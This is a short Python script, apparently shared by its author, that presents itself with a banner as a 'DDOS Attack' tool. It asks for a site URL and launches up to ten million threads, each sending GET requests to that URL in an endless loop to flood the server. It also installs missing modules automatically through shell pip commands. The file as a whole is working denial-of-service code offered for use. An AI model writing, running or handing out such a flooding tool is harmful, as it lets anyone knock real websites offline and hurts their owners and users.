import os
import random
try:
    import requests
except ImportError:
    print("\033[1;31mInstalling 'requests' module...\033[0m")
    os.system('pip install requests')
    import requests

try:
    import threading
except ImportError:
    print("\033[1;31mInstalling 'threading' module...\033[0m")
    os.system('pip install threading')
import threading
try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet")
import pyfiglet
from pyfiglet import figlet_format
try:
	import colorama
except ImportError:
	os.system("pip install colorama")
from colorama import *
#ddos cod
os.system("clear")
from colorama import init, Fore
from pyfiglet import figlet_format
init(autoreset=True)
# Initialize Colorama to enable ANSI escape sequences for colors
init()

# Generate the figlet text with red color
figlet_text = figlet_format("TMX__71")
colored_figlet_text = Fore.RED + figlet_text

print(colored_figlet_text)
line = Fore.GREEN+"__________________________________\n"
colora = [Fore.RED]
colorsu = random.choice(colora)
print(line)

print("Telegram   : ",Fore.RED+"       @tmx71bd")
print("Tools Type :",Fore.BLUE+"        DDOS Attack ")
print("github     :",Fore.GREEN+"        @Md-Lamim")
print("version    :         2.9")
print(line)

print("site url ↓")
urls = input(Fore.RED+"root®tmx71→ ")
#if
os.system("clear")
def send_request():
    try:
        while True:
            response = requests.get(urls)
            print("\033[1;31mTMX71 - pkg send...\033[0m")
            print(response)
    except:
        pass

def ddosTools():
    threads = []
    for _ in range(10000000):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ddosTools()